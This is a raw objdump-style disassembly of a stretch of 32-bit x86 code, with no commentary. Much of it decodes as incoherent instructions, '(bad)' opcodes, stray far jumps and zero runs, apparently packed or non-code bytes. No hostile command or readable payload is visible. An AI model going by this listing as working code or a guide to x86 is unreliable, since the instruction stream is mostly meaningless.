  403138:	(bad)  
  403139:	clc    
  40313a:	(bad)  
  40313b:	mov    eax,ds:0xc83450db
  403140:	add    ebp,DWORD PTR [edx+0x63]
  403143:	sub    edx,DWORD PTR [edi+0x10]
  403146:	mov    WORD PTR [ecx-0x21],?
  403149:	call   0x445d2c
  40314e:	push   0xc0a582e
  403153:	push   es
  403154:	sub    ebp,edi
  403156:	ins    BYTE PTR es:[edi],dx
  403157:	add    ebp,DWORD PTR ds:0x8cea78ff
  40315d:	inc    ebp
  40315e:	ja     0x403147
  403160:	ret    
  403161:	je     0x4031c1
  403163:	jmp    0x4031bb
  403165:	clc    
  403166:	fadd   QWORD PTR [ecx+ebp*8]
  403169:	loopne 0x403139
  40316b:	(bad)  
  40316d:	push   0x2c
  40316f:	add    eax,0x101c8ce9
  403174:	test   eax,0x44884f56
  403179:	cld    
	...
  403186:	add    BYTE PTR [eax],al
  403188:	add    BYTE PTR [edx+0x58],ah
  40318b:	xlat   BYTE PTR ds:[ebx]
  40318c:	mov    WORD PTR [esi+0x143428fd],fs
  403192:	push   edx
  403193:	aad    0xe0
  403195:	xchg   esi,eax
  403196:	cmc    
  403197:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403198:	push   esi
  403199:	push   edi
  40319a:	fcom   QWORD PTR [esp+ecx*1]
  40319d:	or     esp,DWORD PTR [esi]
  40319f:	xchg   esi,eax
  4031a0:	loopne 0x403196
  4031a2:	cmp    esp,DWORD PTR [eax+0x1c0557c5]
  4031a8:	(bad)  
  4031a9:	test   DWORD PTR [ebp+0x5620bfc],0xe4e83e9
  4031b3:	outs   dx,BYTE PTR ds:[esi]
  4031b4:	push   ss
  4031b5:	ss cs test al,0x3
  4031b9:	aam    0x41
  4031bb:	icebp  
  4031bc:	ins    DWORD PTR es:[edi],dx
  4031bd:	arpl   sp,bx
  4031bf:	fdivr  st(7),st
  4031c1:	mov    ch,0x51
  4031c3:	stc    
  4031c4:	loopne 0x4031fc
  4031c6:	or     DWORD PTR [esi+0x56],eax
  4031c9:	pop    ebx
  4031ca:	in     eax,dx
  4031cb:	xor    eax,0x20db9ce1
  4031d0:	lds    esi,FWORD PTR [ebx+0x5]
  4031d3:	add    al,ah
  4031d5:	fdiv   DWORD PTR [eax+edi*1-0x16f2351b]
  4031dc:	add    esp,DWORD PTR [ebx-0x4a]
  4031df:	add    edx,DWORD PTR [edi+eiz*2-0x7a]
  4031e3:	sbb    edx,DWORD PTR [edx]
  4031e5:	shr    DWORD PTR [ebp-0xa8e7dfb],1
  4031eb:	xlat   BYTE PTR ds:[ebx]
  4031ec:	repnz add BYTE PTR [eax],al
	...
  4031fb:	add    BYTE PTR [ebx-0x19],dh
  4031fe:	add    BYTE PTR [edi],al
  403200:	jmp    0xc1d9b6f6
  403205:	inc    esp
  403206:	add    bh,ah
  403208:	pop    ds
  403209:	push   ecx
  40320a:	fisubr DWORD PTR [edx+0x3eec8e7a]
  403210:	call   0xf8163a55
  403215:	mov    ?,WORD PTR [ebp-0xb]
  403218:	(bad)  [eax+0x10]
  40321b:	repnz das 
  40321d:	push   edx
  40321e:	sbb    BYTE PTR [edx-0x31],ah
  403221:	(bad)  
  403222:	jmp    0x5fa6:0x250272e1
  403229:	add    eax,0x806b7200
  40322e:	push   eax
  40322f:	or     BYTE PTR [esi-0x5b54ccfb],bl
  403235:	out    0xe8,eax
  403237:	jle    0x4031e8
  403239:	cmp    cl,cl
  40323b:	stos   DWORD PTR es:[edi],eax
  40323c:	jae    0x403243
  40323e:	push   ebp
  40323f:	(bad)
  403244:	pop    eax
  403245:	add    eax,0x409dee75
  40324a:	or     BYTE PTR [ecx],dh
  40324c:	pop    DWORD PTR [eax+eax*1+0x6a]
  403250:	inc    edx
  403251:	or     DWORD PTR [eax],eax
  403253:	aam    0x65
  403255:	ret    0xf545
  403258:	cwde   
  403259:	sub    eax,0x50bde941
  40325e:	or     BYTE PTR [ecx+0x0],al
	...
  40326d:	add    BYTE PTR [eax],al
  40326f:	je     0x403239
  403271:	add    cl,ch
  403273:	fnstcw WORD PTR [ebp-0x12ab6301]
  403279:	xor    eax,0x305672c
  40327e:	xor    DWORD PTR [eax],esp
  403280:	ss call 0x1abf54
  403286:	add    cl,dh
  403288:	cwde   
  403289:	push   DWORD PTR [ebp+0x52]
  40328c:	pop    ss
  40328d:	call   0x41b1d1
  403292:	call   edi
  403294:	or     dl,BYTE PTR [ebx-0x18]
  403297:	jle    0x40324d
  403299:	add    BYTE PTR [eax],al
  40329b:	mov    cl,0xc7
  40329d:	pop    ebx
  40329e:	leave  
  40329f:	or     BYTE PTR [esi],cl
  4032a1:	add    BYTE PTR [ebp-0x3f],dl
  4032a4:	jmp    0x7500:0x99f8353
  4032ab:	add    eax,0xc20845c3
  4032b0:	sub    eax,0x65790041
  4032b5:	or     al,0x0
  4032b7:	addr16 add al,bh
  4032ba:	inc    ebp
  4032bb:	push   cs
  4032bc:	into   
  4032bd:	sub    BYTE PTR [ecx+0xa],al
  4032c0:	mov    ebx,0xeee20875
  4032c5:	int3   
  4032c6:	add    dl,bh
  4032c8:	mov    ds,eax
  4032ca:	call   edi
  4032cc:	or     eax,ebp
  4032ce:	loope  0x4032ce
  4032d0:	add    eax,0x300
	...
  4032e1:	add    dl,dh
  4032e3:	inc    esi
  4032e4:	push   ebx
  4032e5:	call   0x3ff21b
  4032ea:	xor    DWORD PTR [esi+0x16c275ff],ebx
  4032f0:	call   0x4681e0
  4032f5:	jmp    edi
  4032f7:	or     DWORD PTR [ebx-0x18],edx
  4032fa:	xor    cl,dl
  4032fc:	add    BYTE PTR [eax],al
  4032fe:	dec    ebp
  4032ff:	cmp    eax,0xbf12e808
  403304:	(bad)  
  403305:	call   DWORD PTR [ecx]
  403307:	(bad)  
  403308:	pop    ebx
  403309:	leave  
  40330a:	dec    eax
  40330b:	push   cs
  40330c:	add    BYTE PTR [ebp+0x63],dl
  40330f:	addr16 out dx,eax
  403311:	and    DWORD PTR [edi+0x5e683607],0xffffffed
  403318:	add    eax,DWORD PTR [eax]
  40331a:	dec    ebx
  40331b:	adc    dl,bl
  40331d:	call   DWORD PTR [esi+eiz*2+0x48]
  403321:	cld    
  403322:	loopne 0x4032cd
  403324:	push   esi
  403325:	sub    DWORD PTR [edx+0x617503ee],esp
  40332b:	mov    bl,0xf6
  40332d:	(bad)  
  40332e:	scas   al,BYTE PTR es:[edi]
  40332f:	mov    dl,0x6a
  403331:	add    BYTE PTR [ecx+0x5b75dcee],bh
  403337:	xor    al,0x4
  403339:	push   DWORD PTR [esi+0xf]
  40333c:	sub    eax,DWORD PTR [ecx+0x63]
  40333f:	imul   eax,esp,0x57a79b79
  403345:	cld    
	...
  403352:	add    BYTE PTR [eax],al
  403354:	add    bl,bh
  403356:	cli    
  403357:	fdivr  st,st(7)
  403359:	cld    
  40335a:	lahf   
  40335b:	inc    edi
  40335c:	cld    
  40335d:	arpl   si,bp
  40335f:	add    eax,DWORD PTR [eax]
  403361:	lods   al,BYTE PTR ds:[esi]
  403362:	repz sub al,BYTE PTR [ecx+0x63]
  403366:	jae    0x403397
  403368:	mov    esi,DWORD PTR [ebx+edx*2+0x47]
  40336c:	or     BYTE PTR [esi+0x4f],bh
  40336f:	pop    ebp
  403370:	dec    esp
  403372:	xchg   ebp,eax
  403373:	inc    ecx
  403374:	add    al,0x4e
  403376:	add    ebp,DWORD PTR [edx+0x0]
  403379:	out    dx,al
  40337a:	lods   al,BYTE PTR ds:[esi]
  40337b:	or     edx,DWORD PTR [eax+0x4b]
  40337e:	daa    
  40337f:	sub    al,BYTE PTR [ecx+0x63]
  403382:	inc    edi
  403383:	adc    ch,al
  403385:	push   es
  403386:	inc    eax
  403387:	(bad)  
  403389:	push   0xea05582e
  40338e:	test   eax,0x6b5bebdf
  403393:	lds    eax,FWORD PTR [eax+eiz*8]
  403396:	add    eax,0xc6f603e6
  40339b:	jb     0x4033e4
  40339d:	ja     0x4033d7
  40339f:	and    dl,al
  4033a1:	addr16 add eax,0x347788b4
  4033a7:	jb     0x4033f0
  4033a9:	imul   ecx,DWORD PTR [ecx+ebp*1],0x58
  4033ad:	pop    esi
  4033ae:	test   DWORD PTR [ecx+0x310bd603],esi
  4033b4:	add    al,0x63
  4033b6:	add    eax,0x38e9
	...
  4033c7:	add    BYTE PTR [edx],ch
  4033c9:	ret    
  4033ca:	in     eax,0x3
  4033cc:	leave  
  4033cd:	add    eax,0x4b90443
  4033d2:	inc    ebx
  4033d3:	add    al,0xb9
  4033d5:	add    eax,0x5638451
  4033da:	jmp    0xc14dc2bb
  4033df:	in     al,0x18
  4033e1:	add    eax,0x2c2b88e9
  4033e6:	test   eax,0x3a0c7740
  4033eb:	in     al,dx
  4033ec:	std    
  4033ed:	retf   
  4033ee:	jmp    0xe945def6
  4033f3:	add    esp,DWORD PTR [ebx+0x3c]
  4033f6:	mov    al,0xc1
  4033f8:	addr16 add eax,0x8bc78914
  4033fe:	sub    al,0xc
  403400:	pop    eax
  403401:	(bad)
  403404:	jecxz  0x403422
  403406:	jmp    0xe9dd9e61
  40340b:	add    esp,DWORD PTR [ebx+0x5]
  40340e:	and    cl,al
  403410:	addr16 add eax,0xed5b564e
  403416:	cmp    ecx,eax
  403418:	arpl   WORD PTR ds:0x5094db6a,ax
  40341e:	add    ah,ah
  403420:	mov    ecx,0x60e8fff4
  403425:	or     BYTE PTR [ebp-0x3f7090d7],dl
  40342b:	adc    al,BYTE PTR [eax]
	...
  403439:	add    BYTE PTR [eax],al
  40343b:	pop    ebp
  40343c:	popf   
  40343d:	add    cl,ch
  40343f:	pusha  
  403440:	add    eax,0x55c2bc9
  403445:	push   ebp
  403446:	jb     0x403494
  403448:	add    esp,0xfffffffd
  40344b:	retf   
  40344c:	add    eax,0x512fe96a
  403451:	or     BYTE PTR [ecx],al
  403453:	sbb    ecx,ebx
  403455:	add    cl,ch
  403457:	ins    DWORD PTR es:[edi],dx
  403458:	lds    esi,FWORD PTR [ebx+edx*1+0x6f]
  40345c:	xor    eax,0xd70d8ae8
  403461:	jmp    DWORD PTR [eax-0x5e]
  403464:	fstp   DWORD PTR [eax+0x19]
  403467:	cmp    BYTE PTR [ecx-0x4],dl
  40346a:	mov    esi,0x79e80db2
  40346f:	sbb    al,0x6
  403471:	add    dl,ah
  403473:	and    BYTE PTR [ecx+0xc],dl
  403476:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403477:	xchg   edx,eax
  403478:	fld1   
  40347a:	sbb    DWORD PTR ds:0x20c2ffd7,edx
  403480:	jmp    0x403485
  403482:	bound  esp,QWORD PTR [edx+0x63abc9d9]
  403488:	add    eax,0x32cb7255
  40348d:	mov    edx,DWORD PTR [ebx+ebx*2]
  403490:	imul   edx,DWORD PTR [eax],0x1a
  403493:	mov    bh,0x81
  403495:	cli    
  403496:	cbw    
  403498:	imul   eax,DWORD PTR [eax],0xffffffd3
  40349b:	pusha  
  40349c:	imul   eax,DWORD PTR [ebx],0xffffffc3
	...
  4034ab:	add    BYTE PTR [eax],al
  4034ad:	add    BYTE PTR [eax+0x6b],ah
  4034b0:	add    eax,ecx
  4034b2:	pusha  
  4034b3:	add    eax,0xba0a0000
  4034b8:	jne    0x4034c2
  4034ba:	xor    ah,BYTE PTR [esi]
  4034bc:	retf   
  4034bd:	add    BYTE PTR [edx-0x77],bh
  4034c0:	add    eax,DWORD PTR [eax-0x32]
  4034c3:	push   cs
  4034c4:	push   0x0
  4034c6:	mov    edx,0x8acb6cea
  4034cb:	add    cl,BYTE PTR [ecx+0x688643]
  4034d1:	push   0x7a
  4034d3:	push   0x68486a00
  4034d8:	add    bh,bh
  4034da:	sbb    edx,ebp
  4034dc:	pop    esi
  4034dd:	retf   
  4034de:	cmp    al,BYTE PTR [edx]
  4034e0:	or     eax,eax
  4034e2:	into   
  4034e3:	sub    ecx,DWORD PTR [ecx+0x684e43]
  4034e9:	push   0x4a
  4034eb:	push   0x123e6a00
  4034f0:	call   0x423644
  4034f5:	mov    DWORD PTR [ecx+0x9],ecx
  4034f8:	or     eax,eax
  4034fa:	dec    edi
  4034fb:	and    eax,0xe9fe73ff
  403500:	repnz retf 0x1fa
  403504:	push   DWORD PTR [ebx]
  403506:	shl    dh,cl
  403508:	retf   0xa00
  40350b:	ret    
  40350c:	add    edi,edi
  40350e:	aad    0xba
  403510:	(bad)  
  403511:	jmp    0x403513
	...
  40351f:	add    BYTE PTR [eax],al
  403521:	pop    es
  403522:	mov    ebx,0xc806e833
  403527:	add    BYTE PTR [eax],al
  403529:	std    
  40352a:	(bad)  
  40352b:	(bad)  
  40352c:	call   DWORD PTR [ebp-0x45]
  40352f:	sub    eax,eax
  403531:	adc    edi,DWORD PTR [edi]
  403533:	or     BYTE PTR [edi],cl
  403535:	aas    
  403536:	ret    0xc95b
  403539:	mov    BYTE PTR [edx],cl
  40353b:	add    BYTE PTR [ebp+0x63],dl
  40353e:	arpl   di,sp
  403540:	push   ebx
  403541:	fsubr  DWORD PTR [eax+0x3f58830b]
  403547:	dec    edi
  403548:	pop    ss
  403549:	xchg   esp,eax
  40354a:	call   0x3:0x235ae80b
  403551:	test   BYTE PTR [edx+0x11cee7ff],bl
  403557:	add    eax,DWORD PTR [eax]
  403559:	je     0x403515
  40355b:	jmp    0x403503
  40355d:	cdq    
  40355e:	jmp    0x403563
  403560:	pop    ebx
  403561:	call   0xe757:0xb7ffff29
  403568:	sbb    DWORD PTR [edi],0x4cffe9ff
  40356e:	jne    0x4035a2
  403570:	add    DWORD PTR [esi+0x63412b54],0xffffffde
  403577:	dec    edi
  403578:	adc    eax,0x2869fa34
  40357d:	mov    ds:0x2a8aebde,al
  403582:	(bad)  
  403583:	fld    st(7)
	...
  403591:	add    BYTE PTR [eax],al
  403593:	add    BYTE PTR [esi+0x3c],ah
  403596:	sub    al,0x41
  403598:	arpl   si,bx
  40359a:	add    eax,DWORD PTR [eax]
  40359c:	arpl   WORD PTR [edi+0x17],bx
  40359f:	jb     0x4035dc
  4035a1:	sbb    eax,0xd1770004
  4035a6:	fdiv   DWORD PTR ds:0x42b671
  4035ac:	sti    
  4035ad:	or     bl,bl
  4035af:	jmp    esp
  4035b1:	stos   DWORD PTR es:[edi],eax
  4035b2:	push   DWORD PTR [ecx-0x75]
  4035b5:	sbb    eax,0xde630004
  4035ba:	add    ecx,DWORD PTR [ebp-0x16b11a]
  4035c0:	(bad)  
  4035c1:	out    dx,al
  4035c2:	jmp    0x40356a
  4035c4:	mov    bl,0x5
  4035c6:	data16 (bad) 
  4035c9:	mov    cl,BYTE PTR [ebp-0x17]
  4035cc:	lods   al,BYTE PTR ds:[esi]
  4035cd:	aam    0xb9
  4035cf:	jmp    0x40359a
  4035d1:	aad    0x4e
  4035d3:	fldz   
  4035d5:	dec    edx
  4035d6:	inc    ebp
  4035d7:	xor    al,0xb
  4035d9:	pop    ebx
  4035da:	adc    DWORD PTR [ebx+0x63],eax
  4035dd:	pop    ebp
  4035de:	jmp    0x4035e3
  4035e0:	arpl   WORD PTR [ebp+0x5a87141],ax
  4035e6:	jmp    0x6444d8f7
  4035eb:	cmp    eax,0xc0e90562
  4035f0:	fcompp 
  4035f2:	(bad)  
  4035f3:	fcomp  DWORD PTR [ebp+eax*1-0x17]
  4035f7:	add    eax,DWORD PTR [eax]
	...
  403605:	add    BYTE PTR [eax],al
  403607:	arpl   sp,cx
  403609:	fdivr  QWORD PTR fs:[esp+edx*8]
  40360d:	neg    al
  40360f:	push   esp
  403610:	add    eax,0x5f636de9
  403615:	jmp    0xe99f9987
  40361a:	xchg   dh,ah
  40361c:	int3   
  40361d:	(bad)  
  40361e:	fsub   DWORD PTR [esi*1-0x1be081a4]
  403625:	(bad)  
  403626:	fdiv   DWORD PTR [ebx-0x3308b2c]
  40362c:	shl    DWORD PTR [esi-0x3e2e7128],cl
  403632:	sub    BYTE PTR ss:0x4230ce9,al
  403639:	fs hlt 
  40363b:	arpl   WORD PTR ds:0x1d1d6be9,ax
  403641:	sub    BYTE PTR [ebx+ecx*2],al
  403644:	pop    ebx
  403645:	rol    DWORD PTR [edx+0x63],1
  403648:	(bad)  
  40364a:	xlat   BYTE PTR ds:[ebx]
  40364b:	int3   
  40364c:	rol    DWORD PTR [eax],cl
  40364e:	loop   0x4035f0
  403650:	add    eax,DWORD PTR [eax+edi*2+0x72000560]
  403657:	lock add DWORD PTR [ebp-0x2c44a3],0xbcdd6eb9
  403662:	dec    ebp
  403663:	mov    ebx,0x6b290bd3
  403668:	mov    edx,ebx
  40366a:	jmp    0x40366f
	...
  403677:	add    BYTE PTR [eax],al
  403679:	add    BYTE PTR [eax+0x5],ah
  40367c:	mov    DWORD PTR [eax+eax*4-0x1d],ebp
  403680:	jmp    FWORD PTR [esi]
  403682:	in     eax,0x89
  403684:	call   0x5113d19f
  403689:	xchg   ecx,eax
  40368a:	mov    esi,0x8be9411c
  40368f:	cdq    
  403690:	loopne 0x403690
  403692:	xor    al,0xd3
  403694:	push   0x800560eb
  403699:	adc    ebx,esi
  40369b:	into   
  40369c:	push   esi
  40369e:	pop    eax
  40369f:	lds    ecx,FWORD PTR [edi]
  4036a1:	fld    QWORD PTR gs:0xcde1e900
  4036a8:	add    esi,ebp
  4036aa:	scas   al,BYTE PTR es:[edi]
  4036ab:	jno    0x4036ad
  4036ad:	jmp    0x953f6c12
  4036b2:	pavgw  mm7,mm7
  4036b5:	(bad)  
  4036b6:	dec    edi
  4036b7:	shl    BYTE PTR [ebp-0x2cfb47],cl
  4036bd:	rol    DWORD PTR [esi],0xda
  4036c0:	jmp    FWORD PTR [esi-0x69177716]
  4036c6:	or     al,0xd3
  4036c8:	push   eax
  4036c9:	adc    ecx,ecx
  4036cb:	sbb    eax,0x990de941
  4036d0:	loopne 0x403750
  4036d2:	mov    ah,0xd2
  4036d4:	push   0x6c800
  4036d9:	xor    dl,0x42
  4036dc:	sti    
  4036dd:	inc    DWORD PTR [eax]
	...
  4036eb:	add    BYTE PTR [eax],al
  4036ed:	dec    ebp
  4036ee:	(bad)  
  4036ef:	mov    edi,0xbd868674
  4036f4:	call   0x23ff106
  4036f9:	xchg   esp,eax
  4036fa:	out    dx,eax
  4036fb:	dec    edi
  4036fc:	push   eax
  4036fd:	aas    
  4036fe:	test   ah,bh
  403700:	out    dx,eax
  403701:	sub    eax,0xd2e850ba
  403706:	rol    DWORD PTR [eax],0x0
  403709:	jmp    0xffba:0x1dfc857d
  403710:	push   eax
  403711:	dec    ebp
  403712:	je     0x403700
  403714:	out    dx,eax
  403715:	cmp    eax,0x56cfe8ba
  40371a:	mov    edx,0x744d58ff
  40371f:	call   0x50faa513
  403724:	call   DWORD PTR [edi+0x4dffefdd]
  40372a:	fidivr WORD PTR [esp+esi*8+0x19e8bb4d]
  403731:	xor    bh,BYTE PTR [ebx+0x7c6aebff]
  403737:	test   esp,edi
  403739:	sbb    eax,0x2250ffbb
  40373e:	or     ecx,ecx
  403740:	add    BYTE PTR [edx],cl
  403742:	inc    esi
  403743:	push   eax
  403744:	lea    eax,[edi-0x32001046]
  40374a:	adc    eax,0xeb1eb5ff
  40374f:	(bad)  
  403750:	inc    DWORD PTR [eax]
	...
  40375e:	add    BYTE PTR [eax],al
  403760:	and    dl,BYTE PTR [ebp-0xc]
  403763:	(bad)  
  403764:	mov    ebp,0xcdf7f2dd
  403769:	mov    edx,0x7c63b5ff
  40376e:	out    0xff,al
  403770:	fadd   QWORD PTR [ebx-0x752b0822]
  403776:	(bad)  
  403777:	test   edi,edx
  403779:	adc    dh,0xff
  40377c:	mov    edx,0xbcffd512
  403781:	bound  edx,QWORD PTR [eax-0x4]
  403784:	retf   
  403785:	stc    
  403786:	leave  
  403787:	add    BYTE PTR [ebx-0x4a],ah
  40378a:	add    edi,edi
  40378c:	out    dx,al
  40378d:	sub    esp,esi
  40378f:	call   FWORD PTR [ebx+eax*2+0x4a94f433]
  403796:	imul   eax,DWORD PTR [eax],0xefe7588c
  40379c:	test   BYTE PTR [edx],bl
  40379e:	jmp    0x4037e3
  4037a0:	ja     0x4037c4
  4037a2:	(bad)  
  4037a3:	(bad)  
  4037a4:	fdivp  st(7),st
  4037a6:	in     eax,0xff
  4037a8:	ins    BYTE PTR es:[edi],dx
  4037a9:	mov    edx,esi
  4037ab:	mov    ch,0x73
  4037ad:	or     dl,dh
  4037af:	dec    DWORD PTR [ebx+0xd]
  4037b2:	int3   
  4037b3:	add    BYTE PTR [ebx+0x61],ah
  4037b6:	ret    
  4037b7:	js     0x403751
  4037b9:	iret   
  4037ba:	(bad)  
  4037bb:	lock xor al,0xd8
  4037be:	aad    0xe8
  4037c0:	pushf  
  4037c1:	iret   
  4037c2:	aad    0xff
	...
  4037d0:	add    BYTE PTR [eax],al
  4037d2:	add    dl,ch
  4037d4:	popa   
  4037d5:	in     al,dx
  4037d6:	out    dx,eax
  4037d7:	sub    al,0xb0
  4037d9:	aad    0xb5
  4037db:	cmp    ecx,eax
  4037dd:	aad    0xff
  4037df:	or     esp,DWORD PTR [eax-0x33]
  4037e2:	call   DWORD PTR [esp+edi*2]
  4037e5:	data16 sub BYTE PTR [edx-0x4a2b22],ah
  4037ec:	(bad)  
  4037ed:	aad    0xff
  4037ef:	or     ebx,DWORD PTR [ebp-0x34]
  4037f2:	add    BYTE PTR [ebx+0x5],ah
  4037f5:	bnd ret 
  4037f7:	ja     0x4037e5
  4037f9:	jno    0x403782
  4037fb:	sti    
  4037fc:	loopne 0x403794
  4037fe:	aad    0xe8
  403800:	aad    0x62
  403802:	pop    ss
  403803:	inc    ebp
  403804:	sbb    eax,0xa9d00428
  403809:	jle    0x40379a
  40380b:	mov    edi,0xcbd576e0
  403810:	pop    esi
  403811:	mov    eax,ds:0x6c826304
  403816:	loopne 0x4037d4
  403818:	rcr    BYTE PTR [esi+0x34],1
  40381b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40381c:	call   0x5341:0xd09ce545
  403823:	stos   BYTE PTR es:[edi],al
  403824:	add    eax,0x4da37ee9
  403829:	mov    dl,0xd4
  40382b:	into   
  40382c:	loope  0x403874
  40382e:	aad    0x7c
  403830:	(bad)  [edi]
  403832:	out    0x74,al
  403834:	shl    BYTE PTR [eax+0x7f],1
	...
  403843:	add    BYTE PTR [eax],al
  403845:	add    BYTE PTR [ebx-0x20],bh
  403848:	push   ds
  403849:	aad    0x64
  40384b:	call   0x1601:0xd05ce501
  403852:	dec    esp
  403853:	rol    BYTE PTR [esi],1
  403855:	mov    eax,ds:0x3a81dd1
  40385a:	inc    esp
  40385b:	call   0x2301:0xd03ce50d
  403862:	sub    eax,DWORD PTR ds:0x592308e9
  403868:	add    cl,BYTE PTR [ecx-0x2b39232a]
  40386e:	sbb    al,0x7c
  403870:	(bad)  [eax+0x43115356]
  403876:	arpl   sp,dx
  403878:	test   esp,edx
  40387a:	into   
  40387b:	call   0xd057fe80
  403880:	call   0x456166
  403885:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403886:	fst    st(4)
  403888:	out    dx,eax
  403889:	sahf   
  40388a:	paddusw mm3,QWORD PTR [edx-0x79]
  40388e:	mov    bh,0xcf
  403890:	call   DWORD PTR [esp+edi*4-0x21]
  403894:	inc    DWORD PTR [esi+0x7eee3fb8]
  40389a:	scas   eax,DWORD PTR es:[edi]
  40389b:	das    
  40389c:	pop    esi
  40389d:	mov    al,ds:0x7d8b39a3
  4038a2:	dec    edx
  4038a3:	std    
  4038a4:	out    0x52,eax
  4038a6:	sahf   
  4038a7:	iret   
  4038a8:	push   DWORD PTR [edx+0x0]
	...
  4038b7:	add    BYTE PTR [eax],al
  4038b9:	lock iret 
  4038bb:	xor    eax,0x464825
  4038c0:	pop    esi
  4038c1:	(bad)  
  4038c2:	shl    BYTE PTR [ebp-0xf],1
  4038c5:	out    0x42,eax
  4038c7:	add    al,0x70
  4038c9:	jne    0x403886
  4038cb:	sub    BYTE PTR [eax-0x1a3d41a0],ch
  4038d1:	pusha  
  4038d2:	cmp    cl,BYTE PTR [ebx-0x7371ceb]
  4038d8:	mov    dh,0xa7
  4038da:	dec    ecx
  4038db:	clc    
  4038dc:	jmp    0x6a403e41
  4038e1:	lods   eax,DWORD PTR ds:[esi]
  4038e2:	std    
  4038e3:	(bad)  
  4038e4:	jl     0x403938
  4038e6:	shl    BYTE PTR [ebp-0x13],1
  4038e9:	das    
  4038ea:	pop    ecx
  4038eb:	or     BYTE PTR [ebx-0xcf922a0],al
  4038f1:	adc    bh,cl
  4038f3:	mov    DWORD PTR [ebx+edx*1],ebp
  4038f6:	fild   DWORD PTR [edi]
  4038f8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4038f9:	call   0x8b05:0x60e900d1
  403900:	or     al,0x23
  403902:	push   ds
  403903:	inc    ecx
  403904:	add    dl,bh
  403906:	scas   eax,DWORD PTR es:[edi]
  403907:	adc    ecx,DWORD PTR [ebx+0x473bb53f]
  40390d:	push   cs
  40390e:	cs or  edi,eax
  403911:	aas    
  403912:	rol    DWORD PTR [ecx],0x0
  403915:	cli    
  403916:	add    ch,bl
  403918:	push   es
  403919:	jno    0x40390d
  40391b:	or     bh,bh
	...
  403929:	add    BYTE PTR [eax],al
  40392b:	add    BYTE PTR [edi-0x50],bh
  40392e:	cmp    DWORD PTR [ebp-0xe],0x9
  403932:	jne    0x40393c
  403934:	in     eax,0x2c
  403936:	cld    
  403937:	call   0x3feb74
  40393c:	inc    ecx
  40393d:	cmp    al,0xf8
  40393f:	pop    edi
  403940:	add    ecx,eax
  403942:	or     BYTE PTR [eax],al
  403944:	in     eax,dx
  403945:	dec    edi
  403946:	cmp    eax,0x4852cc
  40394b:	jmp    0x4038cf
  40394d:	or     ecx,DWORD PTR [ebx-0x9c5ddc1]
  403953:	jmp    DWORD PTR ds:0x4e75fece
  403959:	mov    edx,0x4862cc05
  40395e:	add    BYTE PTR [eax],al
  403960:	mov    al,BYTE PTR [edx]
  403962:	add    BYTE PTR [edi+0x39],bl
  403965:	or     al,0x8b
  403967:	in     al,dx
  403968:	lods   eax,DWORD PTR ds:[esi]
  403969:	or     al,0x6a
  40396b:	add    BYTE PTR [ebp+0x2c],dh
  40396e:	or     al,ch
  403970:	jge    0x403932
  403972:	(bad)  
  403973:	call   ecx
  403975:	sar    edi,0x75
  403978:	push   edx
  403979:	stos   BYTE PTR es:[edi],al
  40397a:	and    al,bh
  40397c:	dec    edx
  40397d:	add    al,BYTE PTR [ebx+0xf2c4bf8]
  403983:	push   edi
  403984:	mov    edx,0x327521f3
  403989:	mov    esi,0xdd63778d
  40398e:	jle    0x403958
	...
  40399c:	add    BYTE PTR [eax],al
  40399e:	add    BYTE PTR [eax],dl
  4039a0:	mov    BYTE PTR [edx],dh
  4039a2:	push   0x44f548
  4039a7:	lods   al,BYTE PTR ds:[esi]
  4039a8:	mov    ah,0x6e
  4039aa:	enter  0xdc63,0xfe
  4039ae:	mov    edi,0x40c9e86f
  4039b3:	fcomp  QWORD PTR [di+0x5c]
  4039b7:	jns    0x403995
  4039b9:	cmp    ch,al
  4039bb:	in     al,dx
  4039bc:	mov    ds:0x9c680003,eax
  4039c1:	push   edi
  4039c2:	add    eax,0xeb03dba5
  4039c7:	pusha  
  4039c8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4039c9:	or     al,BYTE PTR [eax]
  4039cb:	adc    al,0x84
  4039cd:	mov    dl,0xc6
  4039cf:	arpl   sp,bx
  4039d1:	xchg   al,bh
  4039d3:	pusha  
  4039d4:	scas   eax,DWORD PTR es:[edi]
  4039d5:	push   es
  4039d6:	(bad)  
  4039d7:	pop    esp
  4039d8:	fdivr  QWORD PTR [esi-0x39]
  4039db:	cmp    eax,0x5fc2bc97
  4039e0:	fdivr  QWORD PTR [eax]
  4039e2:	mov    edi,DWORD PTR [edi+0x5a]
  4039e5:	(bad)  
  4039e6:	cld    
  4039e7:	fsubr  DWORD PTR [eax-0x539cfb01]
  4039ed:	add    eax,DWORD PTR [eax]
  4039ef:	adc    eax,DWORD PTR [ecx+eax*8-0xb]
  4039f3:	ins    BYTE PTR es:[edi],dx
  4039f4:	es jl  0x403a3c
  4039f7:	addr16 out dx,al
  4039f9:	push   edi
  4039fa:	or     al,0x5c
  4039fc:	push   0xffffffcf
  4039fe:	dec    esi
  403a00:	out    0xdb,al
  403a02:	hlt    
	...
  403a0f:	add    BYTE PTR [eax],al
  403a11:	add    BYTE PTR [esi+0x4],dl
  403a14:	sar    bh,cl
  403a16:	into   
  403a17:	scas   al,BYTE PTR es:[edi]
  403a18:	shl    BYTE PTR [ebp+0x6f],cl
  403a1b:	rcl    DWORD PTR [edi-0x4],cl
  403a1e:	dec    ebx
  403a1f:	or     BYTE PTR [bx+si],al
  403a22:	arpl   WORD PTR ds:0xde2757e6,ax
  403a28:	jns    0x403a01
  403a2a:	sbb    al,0xcd
  403a2c:	mov    al,ds:0x3a0567c6
  403a31:	pop    esp
  403a32:	imul   ebx,DWORD PTR [esi],0x28
  403a35:	add    al,0xfb
  403a37:	mov    eax,0x6304a7
  403a3c:	test   eax,0x91805158
  403a41:	pop    esp
  403a42:	inc    edi
  403a43:	push   ds
  403a44:	sub    BYTE PTR [eax+edx*4],al
  403a47:	fnsave [ecx+0x4a0563ca]
  403a4d:	sbb    DWORD PTR [edx-0x5fd316ba],ecx
  403a53:	xor    dh,BYTE PTR [edx-0x20]
  403a56:	sub    eax,0x36d11638
  403a5b:	std    
  403a5c:	sbb    BYTE PTR [edi+0x73e9059d],0x58
  403a63:	(bad)
  403a66:	add    al,0x30
  403a68:	mov    edi,0xe8fda1ba
  403a6d:	jl     0x403a85
  403a6f:	std    
  403a70:	js     0x403aef
  403a72:	stos   DWORD PTR es:[edi],eax
